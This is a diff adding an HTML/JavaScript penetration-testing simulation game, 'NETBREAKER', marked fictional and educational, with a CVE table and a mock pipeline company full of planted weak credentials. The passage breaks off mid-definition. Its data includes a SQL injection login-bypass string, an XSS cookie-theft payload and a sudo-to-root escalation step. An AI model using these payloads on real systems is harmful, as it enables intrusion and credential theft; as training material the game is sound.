@@ -1,0 +1,2351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<title>NETBREAKER</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{height:100%;overflow:hidden;background:#000;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;}
+:root{
+  --g:#00ff41;--g2:#00cc33;--g3:#008822;--gdim:#001a00;
+  --bg:#000;--bg2:#020a02;--border:#0a2a0a;--border2:#0f3f0f;
+  --red:#ff2244;--yellow:#ffdd00;--cyan:#00ffff;--orange:#ff8800;--blue:#4488ff;--purple:#cc44ff;
+  --amber:#ffb000;--textd:#2a5a2a;--textdd:#143014;
+}
+.screen{display:none;position:fixed;inset:0;z-index:10;overflow:hidden;flex-direction:column;}
+.screen.active{display:flex;}
+#s-title{background:#000;align-items:center;justify-content:center;overflow-y:auto;}
+#title-art{font-size:9px;color:var(--g);text-shadow:0 0 10px #00ff4166;white-space:pre;text-align:center;line-height:1.2;margin-bottom:8px;}
+#title-sub{font-size:10px;color:var(--textd);letter-spacing:3px;margin-bottom:4px;text-align:center;}
+#title-ver{font-size:9px;color:var(--textdd);margin-bottom:20px;letter-spacing:2px;text-align:center;}
+.char-grid{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-bottom:14px;max-width:480px;padding:0 10px;}
+.char-slot{width:138px;background:var(--bg2);border:1px solid var(--border2);padding:12px;cursor:pointer;text-align:center;font-family:'Share Tech Mono',monospace;}
+.char-slot:active{border-color:var(--g);}
+.slot-avatar{font-size:24px;margin-bottom:5px;}
+.slot-handle{font-size:13px;color:var(--g);margin-bottom:3px;}
+.slot-info{font-size:9px;color:var(--textd);line-height:1.6;}
+.slot-del{font-size:9px;color:var(--red);margin-top:5px;display:block;cursor:pointer;}
+#new-char-panel{background:var(--bg2);border:1px solid var(--border2);padding:16px;text-align:center;width:260px;display:none;margin-bottom:8px;}
+.nc-label{color:var(--g);font-size:11px;letter-spacing:3px;margin-bottom:10px;}
+#nc-handle{width:100%;background:#000;border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:14px;padding:7px;margin-bottom:9px;outline:none;text-align:center;letter-spacing:2px;}
+#nc-handle:focus{border-color:var(--g);}
+.t-btn{display:inline-block;padding:7px 16px;background:var(--gdim);border:1px solid var(--g2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:11px;cursor:pointer;letter-spacing:2px;margin:3px;user-select:none;}
+.t-btn:active{background:#004a10;}
+.t-btn.danger{border-color:var(--red);color:var(--red);background:#1a0008;}
+.t-btn.sm{font-size:9px;padding:4px 9px;}
+#title-disclaimer{margin-top:14px;font-size:9px;color:var(--textdd);text-align:center;max-width:400px;line-height:1.7;border-top:1px solid var(--border);padding:10px 10px 20px;}
+#s-game{flex-direction:column;background:#000;}
+#topbar{display:flex;justify-content:space-between;align-items:center;padding:4px 8px;border-bottom:1px solid var(--border2);background:#000;flex-shrink:0;min-height:34px;gap:4px;}
+#tb-logo{font-family:'VT323',monospace;font-size:20px;color:var(--g);text-shadow:0 0 8px #00ff4188;flex-shrink:0;}
+#tb-mid{display:flex;align-items:center;gap:8px;flex:1;justify-content:center;overflow:hidden;}
+.tb-stat{font-size:9px;color:var(--textd);white-space:nowrap;}
+.tb-val{color:var(--g);font-size:11px;}
+.tb-val.y{color:var(--yellow);}
+#wanted-row{display:flex;gap:1px;}
+.ws{font-size:12px;color:var(--textdd);}
+.ws.on{color:var(--yellow);}
+.ws.w3.on{color:var(--orange);}
+.ws.w4.on,.ws.w5.on{color:var(--red);}
+#tb-right{display:flex;align-items:center;gap:3px;flex-shrink:0;}
+#tabbar{display:flex;border-bottom:1px solid var(--border2);background:#000;flex-shrink:0;overflow-x:auto;scrollbar-width:none;}
+#tabbar::-webkit-scrollbar{display:none;}
+.tab{flex:1;min-width:58px;padding:7px 3px 5px;text-align:center;font-size:9px;letter-spacing:.5px;color:var(--textd);border-bottom:2px solid transparent;cursor:pointer;user-select:none;white-space:nowrap;}
+.tab .ti{font-size:13px;display:block;margin-bottom:1px;}
+.tab.on{color:var(--g);border-bottom-color:var(--g);}
+#pane-container{flex:1;overflow:hidden;position:relative;min-height:0;}
+.pane{display:none;flex-direction:column;height:100%;background:#000;}
+.pane.on{display:flex;}
+.pane-hdr{display:flex;align-items:center;justify-content:space-between;padding:4px 8px;border-bottom:1px solid var(--border);background:#000;flex-shrink:0;}
+.pane-title{font-size:9px;letter-spacing:2px;color:var(--textd);}
+.pane-meta{font-size:9px;color:var(--textdd);}
+#term-output{flex:1;overflow-y:auto;overflow-x:hidden;padding:5px 8px 3px;font-family:'Share Tech Mono',monospace;font-size:12px;line-height:1.55;color:#88bb88;}
+#term-output::-webkit-scrollbar{width:3px;}
+#term-output::-webkit-scrollbar-thumb{background:var(--border2);}
+.tl{display:block;word-break:break-word;}
+.tl.cmd{color:var(--g);}
+.tl.err{color:var(--red);}
+.tl.sys{color:var(--cyan);}
+.tl.warn{color:var(--orange);}
+.tl.ok{color:#00ff88;}
+.tl.dim{color:var(--textd);}
+.tl.pre{white-space:pre-wrap;font-size:11px;}
+.tl.hdr{color:var(--g);font-size:11px;border-bottom:1px solid var(--border2);margin-bottom:2px;}
+.tl.hint{color:var(--purple);font-size:11px;}
+#term-input-wrap{display:flex;align-items:center;padding:5px 8px;border-top:1px solid var(--border2);background:#000;flex-shrink:0;}
+#term-prompt{color:var(--g);margin-right:4px;font-size:12px;white-space:nowrap;flex-shrink:0;}
+#term-input{flex:1;background:transparent;border:none;color:var(--g);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;caret-color:var(--g);-webkit-appearance:none;}
+#browser-toolbar{display:flex;align-items:center;gap:4px;padding:5px 7px;border-bottom:1px solid var(--border);background:#000;flex-shrink:0;flex-wrap:wrap;}
+#browser-url{flex:1;min-width:100px;background:#020a02;border:1px solid var(--border2);color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:10px;padding:4px 6px;outline:none;}
+#browser-url:focus{border-color:var(--cyan);}
+.br-btn{padding:4px 7px;background:var(--gdim);border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:9px;cursor:pointer;white-space:nowrap;}
+.br-btn:active{background:#003a10;}
+.br-btn.atool{border-color:var(--cyan);color:var(--cyan);}
+#icpt-panel{display:none;background:#000;border:1px solid var(--border2);margin:5px 7px;padding:8px;}
+#icpt-panel.active{display:block;}
+.icpt-hdr{font-size:10px;color:var(--orange);margin-bottom:5px;}
+.icpt-req{background:#020a02;border:1px solid var(--border);font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--g);padding:6px;white-space:pre;overflow-x:auto;max-height:90px;overflow-y:auto;margin-bottom:5px;}
+.icpt-edit{width:100%;background:#000;border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:10px;padding:5px;height:65px;outline:none;resize:vertical;}
+#browser-body{flex:1;overflow-y:auto;padding:10px;font-size:11px;line-height:1.7;color:#88bb88;}
+#browser-body::-webkit-scrollbar{width:3px;}
+#browser-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.site-wrap{max-width:580px;margin:0 auto;}
+.site-nav{display:flex;flex-wrap:wrap;border-bottom:1px solid var(--border2);margin-bottom:10px;}
+.snav{padding:5px 10px;font-size:10px;cursor:pointer;color:var(--textd);border-bottom:2px solid transparent;}
+.snav.on{color:var(--cyan);border-bottom-color:var(--cyan);}
+.site-hdr{padding:10px 0 8px;border-bottom:1px solid var(--border2);margin-bottom:10px;}
+.site-name{font-size:18px;color:var(--cyan);font-family:'VT323',monospace;}
+.site-domain{font-size:9px;color:var(--textd);margin-top:1px;}
+.ssec{margin-bottom:12px;}
+.ssec h3{font-size:11px;color:var(--g);margin-bottom:5px;letter-spacing:1px;}
+.ssec p,.ssec li{font-size:10px;color:#88bb88;line-height:1.8;}
+.ssec ul{padding-left:12px;}
+.ssec .meta{font-size:9px;color:var(--textd);margin-top:3px;}
+.sform{background:#020a02;border:1px solid var(--border);padding:10px;margin-top:6px;}
+.sform input,.sform textarea{width:100%;background:#000;border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:11px;padding:5px;margin:3px 0;outline:none;}
+.sform input:focus,.sform textarea:focus{border-color:var(--g2);}
+.sform label{font-size:9px;color:var(--textd);display:block;margin-top:5px;}
+.fbtn{padding:6px 12px;background:var(--gdim);border:1px solid var(--g2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:10px;cursor:pointer;margin-top:5px;}
+.fbtn:active{background:#004a10;}
+.salert{padding:5px 9px;font-size:10px;margin:5px 0;}
+.salert.ok{background:#001a00;border:1px solid #00aa22;color:#00ff88;}
+.salert.err{background:#1a0004;border:1px solid var(--red);color:var(--red);}
+.salert.warn{background:#1a0d00;border:1px solid var(--orange);color:var(--orange);}
+.stbl{width:100%;border-collapse:collapse;font-size:10px;margin-top:5px;}
+.stbl th{color:var(--g);border-bottom:1px solid var(--border2);padding:3px 7px;text-align:left;font-size:9px;}
+.stbl td{color:#88bb88;padding:3px 7px;border-bottom:1px solid var(--border);}
+.slink{color:var(--cyan);cursor:pointer;text-decoration:underline;}
+.vi{display:inline-block;font-size:8px;padding:1px 4px;border-radius:6px;margin-left:3px;}
+.vi-sqli{background:#1a0800;border:1px solid var(--orange);color:var(--orange);}
+.vi-xss{background:#1a0020;border:1px solid var(--purple);color:var(--purple);}
+.vi-idor{background:#001a1a;border:1px solid var(--cyan);color:var(--cyan);}
+.vi-lfi{background:#1a1a00;border:1px solid var(--yellow);color:var(--yellow);}
+.vi-csrf{background:#0a001a;border:1px solid var(--blue);color:var(--blue);}
+.vi-auth{background:#1a0010;border:1px solid #ff44aa;color:#ff44aa;}
+#fs-path-bar{padding:4px 8px;border-bottom:1px solid var(--border);font-size:9px;color:var(--textd);background:#000;flex-shrink:0;}
+#fs-body{flex:1;overflow-y:auto;padding:3px;}
+#fs-body::-webkit-scrollbar{width:3px;}
+#fs-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.fsi{display:flex;align-items:center;gap:5px;padding:4px 6px;cursor:pointer;font-size:11px;border-bottom:1px solid var(--border);}
+.fsi:active{background:var(--gdim);}
+.fsi.dir{color:var(--cyan);}
+.fsi.fil{color:#88bb88;}
+.fsi.exe{color:var(--g);}
+.fsi.keyf{color:var(--yellow);}
+.fsi.lck{color:var(--textd);cursor:not-allowed;}
+#fs-prev{background:#020a02;border-top:1px solid var(--border2);padding:7px;font-size:10px;color:#88bb88;white-space:pre-wrap;line-height:1.6;max-height:110px;overflow-y:auto;flex-shrink:0;display:none;font-family:'Share Tech Mono',monospace;}
+#net-body{flex:1;overflow-y:auto;padding:7px;}
+#net-body::-webkit-scrollbar{width:3px;}
+#net-body::-webkit-scrollbar-thumb{background:var(--border2);}
+#net-ascii{font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--textd);white-space:pre;line-height:1.3;margin-bottom:9px;}
+.nc{background:#010801;border:1px solid var(--border);padding:9px;margin-bottom:7px;cursor:pointer;}
+.nc:active{border-color:var(--g2);}
+.nc.pwned{border-color:var(--g3);}
+.nc.shell{border-color:var(--yellow);}
+.nc.lkd{opacity:.3;cursor:not-allowed;}
+.nc-name{font-size:13px;color:var(--g);margin-bottom:2px;}
+.nc-ip{font-size:9px;color:var(--textd);margin-bottom:3px;}
+.nc-desc{font-size:9px;color:var(--textd);margin-bottom:5px;line-height:1.5;}
+.nc-tags{display:flex;gap:3px;flex-wrap:wrap;}
+.tag{font-size:8px;padding:1px 5px;border-radius:6px;border:1px solid;}
+.tag-easy{color:#00ff88;border-color:#00ff8833;}
+.tag-med{color:var(--yellow);border-color:#ffdd0033;}
+.tag-hard{color:var(--orange);border-color:#ff880033;}
+.tag-elite{color:var(--red);border-color:#ff224433;}
+.tag-pwned{color:#00ff88;border-color:#00ff8833;}
+.tag-shell{color:var(--yellow);border-color:#ffdd0033;}
+.tag-ids{color:var(--orange);border-color:#ff880033;}
+.tag-fw{color:var(--red);border-color:#ff224433;}
+.tag-lkd{color:var(--textd);border-color:#1a3a1a33;}
+#cve-search-bar{display:flex;gap:5px;padding:5px 7px;border-bottom:1px solid var(--border);background:#000;flex-shrink:0;}
+#cve-search{flex:1;background:#020a02;border:1px solid var(--border2);color:var(--g);font-family:'Share Tech Mono',monospace;font-size:11px;padding:4px 7px;outline:none;}
+#cve-search:focus{border-color:var(--g2);}
+#cve-body{flex:1;overflow-y:auto;padding:7px;}
+#cve-body::-webkit-scrollbar{width:3px;}
+#cve-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.cve-card{background:#010801;border:1px solid var(--border);padding:9px;margin-bottom:7px;cursor:pointer;}
+.cve-id{font-size:13px;color:var(--yellow);margin-bottom:2px;font-family:'VT323',monospace;}
+.cve-name{font-size:10px;color:var(--g);margin-bottom:2px;}
+.cve-score{display:inline-block;font-size:9px;padding:1px 5px;border-radius:6px;margin-bottom:4px;}
+.cve-score.critical{background:#1a0008;border:1px solid var(--red);color:var(--red);}
+.cve-score.high{background:#1a0800;border:1px solid var(--orange);color:var(--orange);}
+.cve-score.med{background:#1a1000;border:1px solid var(--yellow);color:var(--yellow);}
+.cve-desc{font-size:9px;color:var(--textd);line-height:1.6;}
+.cve-detail{display:none;margin-top:7px;font-size:10px;color:#88bb88;line-height:1.7;border-top:1px solid var(--border);padding-top:7px;}
+.cve-detail.open{display:block;}
+#modal-bg{display:none;position:fixed;inset:0;background:#000000cc;z-index:200;align-items:center;justify-content:center;}
+#modal-bg.on{display:flex;}
+#modal-box{background:#000;border:1px solid var(--border2);width:min(96vw,520px);max-height:82vh;display:flex;flex-direction:column;}
+#modal-hdr{padding:9px 12px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-shrink:0;}
+#modal-title{font-size:13px;color:var(--g);}
+#modal-x{cursor:pointer;color:var(--textd);font-size:20px;padding:0 4px;line-height:1;}
+#modal-x:active{color:var(--red);}
+#modal-body{padding:11px 12px;overflow-y:auto;flex:1;font-size:11px;line-height:1.7;color:#88bb88;}
+#modal-body::-webkit-scrollbar{width:3px;}
+#modal-body::-webkit-scrollbar-thumb{background:var(--border2);}
+.toast{position:fixed;bottom:10px;left:50%;transform:translateX(-50%);background:#010801;border:1px solid var(--g);padding:6px 14px;font-size:11px;color:var(--g);z-index:300;white-space:nowrap;animation:toastA 3s ease forwards;pointer-events:none;}
+.toast.w{border-color:var(--orange);color:var(--orange);}
+.toast.e{border-color:var(--red);color:var(--red);}
+@keyframes toastA{0%{opacity:0}10%{opacity:1}80%{opacity:1}100%{opacity:0}}
+#ids-bar{display:none;position:fixed;top:34px;left:0;right:0;background:#1a0004;border-bottom:1px solid var(--red);padding:3px 10px;font-size:10px;color:var(--red);z-index:150;text-align:center;letter-spacing:2px;animation:idsP 1s ease infinite;}
+#ids-bar.on{display:block;}
+@keyframes idsP{0%,100%{opacity:1}50%{opacity:.5}}
+</style>
+</head>
+<body>
+
+<div id="s-title" class="screen active">
+  <div id="title-art"> ███╗   ██╗██████╗ ███████╗██████╗ ██████╗ ██████╗███████╗ █████╗ ██╗  ██╗███████╗██████╗
+ ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
+ ██╔██╗ ██║█████╗     ██║   ██████╔╝██████╔╝██████╔╝█████╗  ██████╔╝█████╔╝ █████╗  ██████╔╝
+ ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗
+ ██║ ╚████║███████╗   ██║   ██████╔╝██║  ██║███████╗██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
+ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</div>
+  <div id="title-sub">// PENETRATION SIMULATION v2.0 //</div>
+  <div id="title-ver">[ ALL TARGETS FICTIONAL — EDUCATIONAL ]</div>
+  <div class="char-grid" id="char-grid"></div>
+  <div id="new-char-panel">
+    <div class="nc-label">[ NEW OPERATIVE ]</div>
+    <input id="nc-handle" placeholder="ENTER CALLSIGN" maxlength="16" autocomplete="off" autocorrect="off" autocapitalize="characters" spellcheck="false">
+    <div style="display:flex;gap:5px;justify-content:center;">
+      <button class="t-btn" id="btn-deploy">DEPLOY</button>
+      <button class="t-btn" id="btn-cancel">CANCEL</button>
+    </div>
+  </div>
+  <div id="title-actions"><button class="t-btn" id="btn-new-op">[ + NEW OPERATIVE ]</button></div>
+  <div id="title-disclaimer">All companies, IPs and exploits are entirely fictional.<br>Educational simulation based on CompTIA Security+ / PenTest+.</div>
+</div>
+
+<div id="s-game" class="screen">
+  <div id="ids-bar">⚠ IDS ALERT — INTRUSION DETECTED — TRACE ACTIVE ⚠</div>
+  <div id="topbar">
+    <div id="tb-logo">NB://</div>
+    <div id="tb-mid">
+      <div class="tb-stat">OPT:<span class="tb-val" id="tb-handle">—</span></div>
+      <div class="tb-stat">₿<span class="tb-val y" id="tb-credits">0</span></div>
+      <div class="tb-stat">REP:<span class="tb-val" id="tb-rep">0</span></div>
+      <div class="tb-stat" id="tb-miner-stat" style="display:none">⛏<span class="tb-val" style="color:var(--amber)" id="tb-miner-rate">0</span>/30s</div>
+      <div class="tb-stat" style="display:flex;align-items:center;gap:2px;">
+        <span style="font-size:8px;color:var(--textd)">HEAT:</span>
+        <div id="wanted-row">
+          <span class="ws" id="ws1">★</span><span class="ws" id="ws2">★</span><span class="ws w3" id="ws3">★</span><span class="ws w4" id="ws4">★</span><span class="ws w5" id="ws5">★</span>
+        </div>
+      </div>
+    </div>
+    <div id="tb-right">
+      <button class="t-btn sm" id="btn-shop">SHOP</button>
+      <button class="t-btn sm danger" id="btn-quit">QUIT</button>
+    </div>
+  </div>
+  <div id="tabbar">
+    <div class="tab on" data-pane="terminal"><span class="ti">⌨</span>TERM</div>
+    <div class="tab" data-pane="browser"><span class="ti">🌐</span>BROWSER</div>
+    <div class="tab" data-pane="fs"><span class="ti">📁</span>FILES</div>
+    <div class="tab" data-pane="network"><span class="ti">🕸</span>NET</div>
+    <div class="tab" data-pane="cve"><span class="ti">🔍</span>CVE-DB</div>
+  </div>
+  <div id="pane-container">
+    <div class="pane on" id="pane-terminal">
+      <div id="term-output"></div>
+      <div id="term-input-wrap">
+        <span id="term-prompt">guest@nb:~$&nbsp;</span>
+        <input id="term-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type help">
+      </div>
+    </div>
+    <div class="pane" id="pane-browser">
+      <div id="browser-toolbar">
+        <input id="browser-url" placeholder="http://">
+        <button class="br-btn" id="btn-go">GO</button>
+        <button class="br-btn" id="btn-icpt">INTERCEPT</button>
+        <button class="br-btn" id="btn-curl">cURL</button>
+        <button class="br-btn" id="btn-fuzz">FUZZER</button>
+        <button class="br-btn" id="btn-cook">COOKIES</button>
+        <button class="br-btn" id="btn-diff">DIFF</button>
+      </div>
+      <div id="icpt-panel">
+        <div class="icpt-hdr">⚡ INTERCEPT MODE ACTIVE</div>
+        <div id="icpt-req" class="icpt-req">[No request yet]</div>
+        <textarea id="icpt-edit" class="icpt-edit" placeholder="Edit request here..."></textarea>
+        <div style="display:flex;gap:4px;margin-top:4px;">
+          <button class="br-btn" id="btn-fwd">FORWARD</button>
+          <button class="br-btn" id="btn-drop">DROP</button>
+          <button class="br-btn" id="btn-sendmod">SEND MODIFIED</button>
+        </div>
+      </div>
+      <div id="browser-body"><div style="padding:28px;text-align:center;color:var(--textd);">No connection.<br><span style="font-size:9px">Enter a URL or browse from Network tab.</span></div></div>
+    </div>
+    <div class="pane" id="pane-fs">
+      <div id="fs-path-bar">PATH: <span id="fs-path-disp">/home/operative</span> · <span id="fs-ctx" style="color:var(--textd)">local</span></div>
+      <div id="fs-body"></div>
+      <div id="fs-prev"></div>
+    </div>
+    <div class="pane" id="pane-network">
+      <div class="pane-hdr"><span class="pane-title">🕸 NETWORK MAP</span><span class="pane-meta" id="net-meta">0 targets</span></div>
+      <div id="net-body"><div id="net-ascii"></div><div id="net-targets"></div></div>
+    </div>
+    <div class="pane" id="pane-cve">
+      <div class="pane-hdr"><span class="pane-title">🔍 CVE DATABASE</span><span class="pane-meta">FICTIONAL + EDUCATIONAL</span></div>
+      <div id="cve-search-bar"><input id="cve-search" placeholder="Search CVEs..."></div>
+      <div id="cve-body"></div>
+    </div>
+  </div>
+</div>
+
+<div id="modal-bg">
+  <div id="modal-box">
+    <div id="modal-hdr"><span id="modal-title">INFO</span><span id="modal-x">✕</span></div>
+    <div id="modal-body"></div>
+  </div>
+</div>
+
+<script>
+'use strict';
+
+// Safe constants for strings that would be mangled
+var SCRTAG = '\u003c' + 'script\u003e';
+var ESCRTAG = '\u003c/' + 'script\u003e';
+
+// ═══════════════════════════ INDEXEDDB ═══════════════════════════
+var DB = null;
+function initDB(cb) {
+  var req = indexedDB.open('netbreaker_db', 5);
+  req.onupgradeneeded = function(e) {
+    var db = e.target.result;
+    if (!db.objectStoreNames.contains('saves')) db.createObjectStore('saves', {keyPath:'handle'});
+  };
+  req.onsuccess = function(e) { DB = e.target.result; cb(); };
+  req.onerror = function() { cb(); };
+}
+function dbGetAll(cb) {
+  if (!DB) { cb([]); return; }
+  var r = DB.transaction('saves','readonly').objectStore('saves').getAll();
+  r.onsuccess = function() { cb(r.result || []); };
+  r.onerror = function() { cb([]); };
+}
+function dbPut(obj, cb) {
+  if (!DB) { if (cb) cb(); return; }
+  var tx = DB.transaction('saves','readwrite');
+  tx.objectStore('saves').put(obj);
+  tx.oncomplete = function() { if (cb) cb(); };
+}
+function dbDelete(handle, cb) {
+  if (!DB) { if (cb) cb(); return; }
+  var tx = DB.transaction('saves','readwrite');
+  tx.objectStore('saves').delete(handle);
+  tx.oncomplete = function() { if (cb) cb(); };
+}
+
+// ═══════════════════════════ CVE DATA ═══════════════════════════
+var CVE_DB = [
+  {id:'CVE-2016-0777', name:'OpenSSH User Enumeration', score:5.8, sev:'med', service:'OpenSSH < 7.6', port:22,
+   desc:'Timing side-channel in auth allows enumeration of valid usernames.',
+   exploit:'Command: exploit CVE-2016-0777 <ip>\nReturns valid username list via timing oracle',
+   fix:'Upgrade OpenSSH 7.6+. Rate-limit auth attempts.', phase:'Recon'},
+  {id:'CVE-2017-7679', name:'Apache mod_mime Buffer Overflow RCE', score:9.8, sev:'critical', service:'Apache HTTP 2.2.x', port:80,
+   desc:'Buffer overflow in mod_mime allows unauthenticated RCE via malformed MIME.',
+   exploit:'Requires: metasploit\nCommand: exploit CVE-2017-7679 <ip>\nResult: www-data shell',
+   fix:'Upgrade Apache 2.4.26+. Disable mod_mime.', phase:'Exploitation'},
+  {id:'CVE-2020-1938', name:'Tomcat Ghostcat AJP File Read/RCE', score:9.8, sev:'critical', service:'Tomcat 6.x-9.0.30', port:8009,
+   desc:'AJP connector allows unauthenticated file read and RCE when upload exists.',
+   exploit:'Requires: metasploit\nCommand: exploit CVE-2020-1938 <ip>\nReads: /opt/tomcat/conf/tomcat-users.xml',
+   fix:'Disable AJP or bind to localhost. Upgrade Tomcat.', phase:'Exploitation'},
+  {id:'CVE-2021-22144', name:'Kibana SSRF Canvas Renderer', score:7.2, sev:'high', service:'Kibana 7.x < 7.13.1', port:5601,
+   desc:'SSRF allows pivoting to internal Elasticsearch clusters.',
+   exploit:'Requires: metasploit\nCommand: exploit CVE-2021-22144 <ip>\nPivots to internal ES port 9200',
+   fix:'Upgrade Kibana 7.13.1+. Enable ES security.', phase:'Pivot'},
+  {id:'CVE-2022-1388', name:'F5 BIG-IP iControl REST Auth Bypass', score:9.8, sev:'critical', service:'F5 BIG-IP 13.x-16.x', port:443,
+   desc:'Auth bypass allows unauthenticated RCE as root via iControl REST.',
+   exploit:'Requires: metasploit-pro\nCommand: exploit CVE-2022-1388 <ip>\nResult: root shell',
+   fix:'Apply F5 hotfix. Block iControl REST from internet.', phase:'Exploitation'},
+  {id:'NB-MOD-001', name:'vsftpd 2.3.4 Backdoor (Simulated)', score:10.0, sev:'critical', service:'vsftpd 2.3.4', port:21,
+   desc:'[FICTIONAL SIM] Backdoor triggers bind shell on port 6200 when username contains :)',
+   exploit:'Requires: netcat (pre-installed)\nCommand: exploit vsftpd-backdoor <ip>\nResult: root bind shell on port 6200',
+   fix:'Replace vsftpd immediately. Use SFTP.', phase:'Exploitation root'},
+  {id:'NB-MOD-002', name:'S7comm Auth Bypass ICS/SCADA (Simulated)', score:10.0, sev:'critical', service:'Siemens S7comm (Sim)', port:102,
+   desc:'[FICTIONAL SIM] Legacy S7comm has no auth, allowing direct PLC register read/write.',
+   exploit:'Requires: metasploit-pro\nCommand: exploit S7-auth-bypass <ip>\nReads PLC map, pivots to HMI admin',
+   fix:'Segment ICS networks. VPN for remote. Patch vendor.', phase:'ICS Exploitation'},
+  {id:'NB-WEB-001', name:'SQL Injection Error-Based (Simulated)', score:8.5, sev:'high', service:'PHP/MySQL Web App', port:80,
+   desc:'[FICTIONAL SIM] Unsanitized SQL in login form. Auth bypass and credential dump possible.',
+   exploit:"Browser: inject in username field: ' OR '1'='1'--\nTerminal: exploit sqli <ip>\nResult: auth bypass + credential dump",
+   fix:'Use prepared statements. Parameterize queries.', phase:'Web Exploitation'},
+  {id:'NB-WEB-002', name:'XSS Reflected (Simulated)', score:6.1, sev:'med', service:'Web App Search/Contact', port:80,
+   desc:'[FICTIONAL SIM] User input echoed without encoding. Script injection steals cookies.',
+   exploit:'Payload: alert(document.cookie) in script tags\nTerminal: exploit xss <ip>\nUse FUZZER in browser pane',
+   fix:'Encode output. Set Content-Security-Policy.', phase:'Web Exploitation'},
+];
+
+var COMPANIES = [
+  {id:'c0', name:'PetroFlow Systems', domain:'petroflow.local', ip:'192.168.10.14',
+   industry:'Oil & Gas Pipeline Monitoring',
+   desc:'Small regional pipeline operator. ~60 staff. Legacy infra, no security stack.',
+   diff:'easy', repReq:0,
+   sec:{fw:false,ids:false,mfa:false,waf:false},
+   scanReq:{nmap:false,gobuster:false,sniffer:false},
+   ports:[
+     {num:21,svc:'FTP',ver:'vsftpd 2.3.4',vuln:'vsftpd-backdoor',note:'Known backdoor version'},
+     {num:22,svc:'SSH',ver:'OpenSSH 7.2p2',vuln:'CVE-2016-0777',note:'User enum via timing'},
+     {num:80,svc:'HTTP',ver:'Apache/2.2.34',vuln:'CVE-2017-7679',note:'mod_mime overflow + SQLi on /login'},
+     {num:3306,svc:'MySQL',ver:'5.5.62',vuln:'weak-creds',note:'root:root default credentials'},
+   ],
+   creds:{'marcus.reed':'Pipeline2019!','backup':'backup123','root':'root'},
+   rootMethod:'sudo -l shows NOPASSWD: /bin/bash then sudo /bin/bash',
+   webVulns:['sqli','xss','idor'],
+   fs:{
+     '/':['etc','home','var','tmp','root','opt'],
+     '/etc':['passwd','shadow','hosts','crontab'],
+     '/home':['marcus.reed','backup'],
+     '/home/marcus.reed':['notes.txt','vpn_config.ovpn','.bash_history'],
+     '/home/backup':['backup.sh','creds.bak'],
+     '/var':['log','www'],'/var/www':['html'],
+     '/var/www/html':['index.php','login.php','config.php','search.php','api'],
+     '/var/www/html/api':['users.php','orders.php'],
+     '/root':['flag.txt','id_rsa'],
+     '/tmp':[], '/opt':['scripts'], '/opt/scripts':['monitor.sh'],
+   },
+   fc:{
+     '/home/marcus.reed/notes.txt':'== NOTES ==\nReminder: rotate backup user password (still backup123)\nTODO: fix old vsftpd -- sketchy version\nDB server 192.168.10.20 - root/root\nSearch page breaks on quotes -- talk to dev\nI can sudo to bash NOPASSWD -- IT should review that',
+     '/home/marcus.reed/.bash_history':'ssh root@192.168.10.20\nsudo /bin/bash\ncat /var/www/html/config.php',
+     '/home/backup/creds.bak':'# Legacy cred store -- SHOULD BE DELETED\nmysql_root: root\nmysql_app: pfapp / PetroApp#1\nssh_backup: backup / backup123',
+     '/home/backup/backup.sh':'#!/bin/bash\n# Runs as root via cron\ntar -czf /tmp/web_backup_$(date +%F).tar.gz /var/www/html',
+     '/var/www/html/config.php':'<?php\n$db_host = "192.168.10.20";\n$db_user = "root";\n$db_pass = "root";\n$db_name = "petroflow";\n$debug_mode = true;\n?>',
+     '/etc/passwd':'root:x:0:0:root:/root:/bin/bash\nmarcus.reed:x:1001:1001::/home/marcus.reed:/bin/bash\nbackup:x:1002:1002::/home/backup:/bin/bash',
+     '/etc/hosts':'127.0.0.1 localhost\n192.168.10.14 petroflow.local\n192.168.10.20 pf-db01',
+     '/etc/crontab':'*/5 * * * *  root  /opt/scripts/monitor.sh\n0 2 * * *    root  /home/backup/backup.sh',
+     '/root/flag.txt':'NETBREAKER{PF_R00T_4CQUIRED}\n\nRoot on PetroFlow Systems confirmed.\nExfiltrate this file to complete the contract.',
+   },
+   site:{pages:['home','about','services','contact','portal','api']},
+   contracts:[
+     {id:'pf-c1',title:'Recover DB Credentials',desc:'Exfiltrate /var/www/html/config.php',target:'/var/www/html/config.php',reward:{c:300,r:60}},
+     {id:'pf-c2',title:'Root the Box',desc:'Achieve root and exfiltrate /root/flag.txt',target:'/root/flag.txt',reward:{c:800,r:150}},
